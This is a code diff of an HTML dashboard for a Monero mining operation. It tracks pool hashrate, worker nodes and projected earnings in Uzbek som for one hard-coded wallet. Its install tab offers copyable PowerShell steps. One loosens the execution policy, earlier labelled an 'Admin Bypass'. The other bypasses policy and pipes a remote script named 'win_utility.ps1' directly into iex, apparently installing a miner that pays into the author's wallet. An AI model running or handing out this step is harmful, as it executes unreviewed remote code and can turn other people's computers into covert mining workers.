@@ -3,209 +3,237 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XMR Farm: Ultima v15.2</title>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <title>XMR Farm:By Imamaliev</title>
     <style>
         :root {
             --bg-color: #05080f;
-            --panel-bg: rgba(13, 18, 30, 0.7);
+            --glass-bg: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.08);
             --accent-color: #38bdf8;
             --money-color: #4ade80;
             --uzs-color: #fbbf24;
             --text-color: #f1f5f9;
-            --border: rgba(255, 255, 255, 0.08);
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin: 0; padding: 0; box-sizing: border-box; cursor: none; }
         body { 
             background-color: var(--bg-color); color: var(--text-color); 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-            min-height: 100vh; background: radial-gradient(circle at 50% 0%, #0d121e 0%, #05080f 100%);
+            font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; 
+            overflow-x: hidden; background: radial-gradient(circle at 50% 0%, #0d121e 0%, #05080f 100%);
         }
 
-        /* Nav */
-        .nav-tabs {
-            display: flex; justify-content: center; gap: 8px; padding: 12px;
-            position: sticky; top: 0; background: rgba(5, 8, 15, 0.9); backdrop-filter: blur(15px); z-index: 100;
-            border-bottom: 1px solid var(--border);
+        /* LIQUID TABS (iPhone Style) */
+        .nav-container {
+            display: flex; justify-content: center; padding: 20px 0;
+            position: sticky; top: 0; z-index: 100; backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--glass-border);
         }
+
+        .tabs-wrapper {
+            position: relative; display: flex; background: rgba(255, 255, 255, 0.05);
+            padding: 5px; border-radius: 16px; border: 1px solid var(--glass-border);
+        }
+
         .tab-btn {
-            background: transparent; border: 1px solid var(--border); color: var(--text-color);
-            padding: 10px 16px; border-radius: 8px; font-weight: 600; font-size: 0.75rem;
-            text-transform: uppercase; letter-spacing: 0.5px; flex: 1; max-width: 120px;
-        }
-        .tab-btn.active { background: var(--accent-color); color: #000; border-color: var(--accent-color); }
-
-        .container { max-width: 800px; margin: 0 auto; width: 92%; padding: 15px 0; }
-        .section { display: none; }
-        .section.active { display: block; animation: fadeIn 0.2s ease-in; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        /* Cards */
-        .main-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px; }
-        @media (max-width: 500px) { .main-grid { grid-template-columns: 1fr; } }
-
-        .glass-card { 
-            background: var(--panel-bg); border: 1px solid var(--border); 
-            padding: 18px; border-radius: 14px; position: relative;
-        }
-        .label { font-size: 0.6rem; opacity: 0.5; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; display: block; }
-        .value { font-size: 1.4rem; font-weight: 800; display: block; }
-
-        .chart-container { 
-            background: var(--panel-bg); border: 1px solid var(--border); 
-            padding: 10px; border-radius: 14px; margin-bottom: 15px; height: 180px;
+            position: relative; z-index: 2; background: none; border: none;
+            color: var(--text-color); padding: 10px 25px; border-radius: 12px;
+            font-weight: 600; font-size: 0.9rem; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        /* Profit */
-        .profit-table { width: 100%; border-collapse: collapse; }
-        .profit-table td { padding: 14px 0; border-bottom: 1px solid var(--border); font-size: 0.9rem; }
-        .p-val { text-align: right; color: var(--money-color); font-weight: bold; }
+        .tab-btn.active { color: #000; }
 
-        /* Footer */
-        .footer { 
-            text-align: center; padding: 40px 0; 
-            color: #4b5563; font-size: 0.65rem; 
-            letter-spacing: 1px; text-transform: uppercase; opacity: 0.7;
+        /* Тот самый "Liquid" бегунок */
+        .tab-indicator {
+            position: absolute; top: 5px; left: 5px; bottom: 5px;
+            background: var(--accent-color); border-radius: 12px;
+            transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+            box-shadow: 0 0 15px rgba(56, 189, 248, 0.4); z-index: 1;
         }
 
+        .container { max-width: 1000px; margin: 0 auto; width: 92%; padding: 20px 0; }
+        .section { display: none; opacity: 0; transform: translateY(10px); transition: 0.4s; }
+        .section.active { display: block; opacity: 1; transform: translateY(0); }
+
+        /* CARDS */
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; margin-bottom: 30px; }
+        .stat-card { 
+            background: var(--glass-bg); backdrop-filter: blur(10px); 
+            border: 1px solid var(--glass-border); padding: 20px; border-radius: 20px; text-align: center;
+        }
+        .stat-card span { display: block; font-size: 0.7rem; opacity: 0.5; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 1px; }
+        .stat-card b { font-size: 1.5rem; display: block; }
+
+        #balance_uzs { color: var(--uzs-color); font-size: 1.1rem; }
+        .daily-profit { color: var(--money-color); font-size: 0.85rem; margin-top: 5px; display: block; font-weight: bold; }
+
+        .pc-card {
+            background: var(--glass-bg); border: 1px solid var(--glass-border);
+            padding: 25px; border-radius: 20px; text-align: center; position: relative; overflow: hidden;
+        }
+
+        /* SETUP & CODES */
         code { 
-            display: block; background: #000; padding: 12px; border-radius: 8px; 
-            color: var(--accent-color); border: 1px solid var(--border);
-            font-size: 0.7rem; margin: 10px 0; overflow-x: auto; white-space: pre-wrap;
+            display: block; background: #000; padding: 15px; border-radius: 12px; 
+            color: var(--accent-color); border: 1px solid var(--glass-border);
+            font-size: 0.8rem; margin: 10px 0; position: relative; transition: 0.3s;
+            white-space: pre-wrap; word-break: break-all; text-align: left;
+        }
+        code:active { transform: scale(0.98); background: #0a1120; }
+        .copy-hint { font-size: 0.6rem; color: var(--money-color); position: absolute; top: 5px; right: 10px; opacity: 0; transition: 0.3s; }
+
+        /* FOOTER (Серый и мелкий) */
+        .footer { text-align: center; padding: 40px 0; color: #4b5563; font-size: 0.65rem; text-transform: uppercase; letter-spacing: 2px; }
+
+        .glass-cursor { 
+            position: fixed; width: 20px; height: 20px; background: rgba(255,255,255,0.1); 
+            border-radius: 50%; pointer-events: none; z-index: 9999; backdrop-filter: blur(4px);
+            transform: translate(-50%, -50%); border: 1px solid rgba(255,255,255,0.2); transition: width 0.2s, height 0.2s;
+        }
+
+        @media (max-width: 600px) {
+            .grid { grid-template-columns: 1fr; }
+            .tab-btn { padding: 8px 15px; font-size: 0.8rem; }
         }
     </style>
 </head>
 <body>
 
-<nav class="nav-tabs">
-    <button class="tab-btn active" onclick="switchTab(this, 'dashboard')">🛰 Term</button>
-    <button class="tab-btn" onclick="switchTab(this, 'profit')">💰 Cash</button>
-    <button class="tab-btn" onclick="switchTab(this, 'install')">🛠 Init</button>
-</nav>
+<div class="glass-cursor" id="cursor"></div>
+
+<div class="nav-container">
+    <div class="tabs-wrapper">
+        <div class="tab-indicator" id="indicator"></div>
+        <button class="tab-btn active" onclick="switchTab(this, 'dashboard')">📊 Dashboard</button>
+        <button class="tab-btn" onclick="switchTab(this, 'install')">🛠 Установка</button>
+    </div>
+</div>
 
 <div class="container">
     <section id="dashboard" class="section active">
-        <div class="main-grid">
-            <div class="glass-card">
-                <span class="label">Pay Hashrate</span>
-                <b class="value" id="hashrate" style="color: var(--accent-color);">0.00 KH/s</b>
-            </div>
-            <div class="glass-card">
-                <span class="label">Pending XMR</span>
-                <b class="value" id="balance_xmr" style="color: var(--uzs-color);">0.0014</b>
-                <span id="balance_uzs" style="font-size: 0.75rem; opacity: 0.6;">0 UZS</span>
+        <div class="grid">
+            <div class="stat-card"><span>Pay Hashrate</span><b id="hashrate" style="color: var(--accent-color);">0.00 KH/s</b></div>
+            <div class="stat-card"><span>Воркеры</span><b id="workers">0</b></div>
+            <div class="stat-card"><span>Баланс XMR</span><b id="balance_xmr">0.000000</b></div>
+            <div class="stat-card">
+                <span>Прогноз Дохода</span>
+                <b id="balance_uzs">0 UZS</b>
+                <span class="daily-profit" id="daily_p">~0 UZS / день</span>
             </div>
         </div>
-        <div class="chart-container"><canvas id="hashChart"></canvas></div>
-        <div id="workerList"></div>
-    </section>
 
-    <section id="profit" class="section">
-        <div class="glass-card">
-            <span class="label">ESTIMATED INCOME (UZS)</span>
-            <table class="profit-table">
-                <tr><td>1 Час</td><td class="p-val" id="p-hour">0 UZS</td></tr>
-                <tr><td>24 Часа</td><td class="p-val" id="p-day" style="font-size: 1.1rem; color: var(--accent-color);">0 UZS</td></tr>
-                <tr><td>7 Дней</td><td class="p-val" id="p-week">0 UZS</td></tr>
-                <tr><td>30 Дней</td><td class="p-val" id="p-month">0 UZS</td></tr>
-            </table>
-        </div>
+        <h3 style="margin: 0 0 20px 10px; font-size: 0.8rem; color: var(--accent-color); text-transform: uppercase; letter-spacing: 1px; opacity: 0.7;">Мониторинг узлов</h3>
+        <div id="logBox" class="log-container">Загрузка систем...</div>
     </section>
 
     <section id="install" class="section">
-        <div class="glass-card">
-            <span class="label">Step 1: Admin Bypass</span>
-            <code>Set-ExecutionPolicy RemoteSigned -Force</code>
-            <span class="label">Step 2: Deployment</span>
-            <code>powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm 'https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/main/win_utility.ps1' | iex"</code>
+        <div class="stat-card" style="text-align: left; margin-bottom: 20px;">
+            <span class="label">Шаг 1: Разблокировка</span>
+            <code onclick="copyCode(this)">Set-ExecutionPolicy RemoteSigned -Force<span class="copy-hint">Скопировано!</span></code>
+        </div>
+        <div class="stat-card" style="text-align: left;">
+            <span class="label">Шаг 2: Майнер (Isfandiyor-star)</span>
+            <code onclick="copyCode(this)">powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm 'https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/main/win_utility.ps1' | iex"<span class="copy-hint">Скопировано!</span></code>
         </div>
     </section>
 
-    <div class="footer">Ultima Engine • Angren • v15.2.1</div>
+    <div class="footer">XMR ULTIMA ENGINE • ANGREN • v15.5</div>
 </div>
 
 <script>
     const WALLET = '429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA';
-    let xmrPrice = 168.0, uzsRate = 13000.0;
-    let hashHistory = Array(12).fill(0), chart;
+    let xmrPrice = 168.0, uzsRate = 13000;
 
-    function initChart() {
-        const ctx = document.getElementById('hashChart').getContext('2d');
-        chart = new Chart(ctx, {
-            type: 'line',
-            data: {
-                labels: Array(12).fill(''),
-                datasets: [{
-                    data: hashHistory,
-                    borderColor: '#38bdf8',
-                    borderWidth: 2,
-                    pointRadius: 0,
-                    fill: true,
-                    backgroundColor: 'rgba(56, 189, 248, 0.03)',
-                    tension: 0.4
-                }]
-            },
-            options: {
-                responsive: true, maintainAspectRatio: false,
-                scales: { y: { display: false }, x: { display: false } },
-                plugins: { legend: { display: false } }
-            }
-        });
-    }
-
+    // Плавное переключение вкладок (Liquid Glass)
     function switchTab(btn, tabId) {
         document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
         document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        
+        const indicator = document.getElementById('indicator');
+        indicator.style.width = btn.offsetWidth + 'px';
+        indicator.style.left = btn.offsetLeft + 'px';
+
         document.getElementById(tabId).classList.add('active');
         btn.classList.add('active');
     }
 
-    async function updateData() {
-        try {
-            const [resStats, resXMR, resUZS] = await Promise.all([
-                fetch(`https://api.moneroocean.stream/miner/${WALLET}/stats?_=${Date.now()}`).then(r => r.json()),
-                fetch('https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd').then(r => r.json()),
-                fetch('https://open.er-api.com/v6/latest/USD').then(r => r.json())
-            ]);
+    // Надежное копирование
+    function copyCode(el) {
+        const text = el.innerText.replace('Скопировано!', '').trim();
+        const hint = el.querySelector('.copy-hint');
+        
+        if (navigator.clipboard && window.isSecureContext) {
+            navigator.clipboard.writeText(text);
+        } else {
+            let textArea = document.createElement("textarea");
+            textArea.value = text;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+        }
 
-            xmrPrice = resXMR.monero.usd;
-            uzsRate = resUZS.rates.UZS;
-
-            const payHash = resStats.hash2; // Тот самый 17.4 KH/s
-            const curBal = resStats.amtDue / 1e12;
-            
-            document.getElementById('hashrate').innerText = (payHash / 1000).toFixed(2) + ' KH/s';
-            document.getElementById('balance_xmr').innerText = curBal.toFixed(6);
-            document.getElementById('balance_uzs').innerText = Math.round(curBal * xmrPrice * uzsRate).toLocaleString() + ' UZS';
-
-            // НОВАЯ ТОЧНАЯ ФОРМУЛА
-            // На основе твоих данных: 17.4 KH/s дает 0.0013 XMR в сутки
-            const dailyXMR = (payHash / 17400) * 0.00131; 
-            const dUZS = dailyXMR * xmrPrice * uzsRate;
-
-            document.getElementById('p-hour').innerText = Math.round(dUZS / 24).toLocaleString() + ' UZS';
-            document.getElementById('p-day').innerText = Math.round(dUZS).toLocaleString() + ' UZS';
-            document.getElementById('p-week').innerText = Math.round(dUZS * 7).toLocaleString() + ' UZS';
-            document.getElementById('p-month').innerText = Math.round(dUZS * 30).toLocaleString() + ' UZS';
-
-            hashHistory.push(payHash / 1000);
-            hashHistory.shift();
-            chart.update();
-
-            document.getElementById('workerList').innerHTML = `
-                <div class="glass-card" style="border-left: 3px solid var(--accent-color)">
-                    <div style="display:flex; justify-content:space-between; align-items:center;">
-                        <span class="label" style="margin:0">E-MAXPC</span>
-                        <span style="color:var(--money-color); font-size:0.65rem;">● Online</span>
-                    </div>
-                    <div style="font-size:0.7rem; opacity:0.5; margin-top:8px;">Shares: ${Math.round(resStats.validShares).toLocaleString()}</div>
-                </div>
-            `;
-        } catch (e) { console.error("Sync Error"); }
+        hint.style.opacity = "1";
+        el.style.borderColor = "var(--money-color)";
+        setTimeout(() => { hint.style.opacity = "0"; el.style.borderColor = "var(--glass-border)"; }, 1500);
     }
 
-    initChart();
+    async function updateData() {
+        try {
+            const [resStats, resIdent, resRates] = await Promise.all([
+                fetch(`https://api.moneroocean.stream/miner/${WALLET}/stats?_=${Date.now()}`).then(r => r.json()),
+                fetch(`https://api.moneroocean.stream/miner/${WALLET}/identifiers?_=${Date.now()}`).then(r => r.json()),
+                fetch('https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd').then(r => r.json())
+            ]);
+
+            if(resRates.monero) xmrPrice = resRates.monero.usd;
+            const payHash = resStats.hash2;
+            const xmrBal = resStats.amtDue / 1e12;
+
+            document.getElementById('hashrate').innerText = (payHash / 1000).toFixed(2) + ' KH/s';
+            document.getElementById('workers').innerText = resIdent.length || 1;
+            document.getElementById('balance_xmr').innerText = xmrBal.toFixed(6);
+            document.getElementById('balance_uzs').innerText = Math.round(xmrBal * xmrPrice * uzsRate).toLocaleString() + ' UZS';
+
+            // Реальный расчет по данным твоего скрина (17.4 KH/s ~ 0.0013 XMR)
+            const dailyXMR = (payHash / 17400) * 0.00131;
+            const dailyUZS = dailyXMR * xmrPrice * uzsRate;
+            document.getElementById('daily_p').innerText = '~' + Math.round(dailyUZS).toLocaleString() + ' UZS / день';
+
+            const logBox = document.getElementById('logBox');
+            logBox.innerHTML = '';
+            
+            const nodes = resIdent.length > 0 ? resIdent : [{identifier: 'E-MAXPC', hash2: payHash, validShares: resStats.validShares}];
+            nodes.forEach(n => {
+                if(n.identifier === 'global') return;
+                const card = document.createElement('div');
+                card.className = 'pc-card';
+                card.innerHTML = `
+                    <div style="font-size:0.6rem; opacity:0.4; text-transform:uppercase;">Node</div>
+                    <div style="font-weight:800; margin:10px 0;">${n.identifier || 'Miner'}</div>
+                    <div style="color:var(--accent-color); font-size:1.8rem; font-weight:900;">${((n.hash2 || payHash)/1000).toFixed(2)} KH/s</div>
+                    <div style="font-size:0.75rem; opacity:0.6; margin-top:10px;">💎 ${Math.round(n.validShares || resStats.validShares).toLocaleString()} shares</div>
+                    <div style="position:absolute; bottom:0; left:0; height:4px; width:100%; background:var(--accent-color); box-shadow:0 0 10px var(--accent-color);"></div>
+                `;
+                logBox.appendChild(card);
+            });
+        } catch (e) { console.error("Error updating..."); }
+    }
+
+    // Инициализация Liquid Tabs
+    window.onload = () => {
+        const activeBtn = document.querySelector('.tab-btn.active');
+        const indicator = document.getElementById('indicator');
+        indicator.style.width = activeBtn.offsetWidth + 'px';
+        indicator.style.left = activeBtn.offsetLeft + 'px';
+    };
+
+    // Курсор
+    document.addEventListener('mousemove', e => {
+        const c = document.getElementById('cursor');
+        c.style.left = e.clientX + 'px';
+        c.style.top = e.clientY + 'px';
+    });
+
     updateData();
     setInterval(updateData, 30000);
 </script>
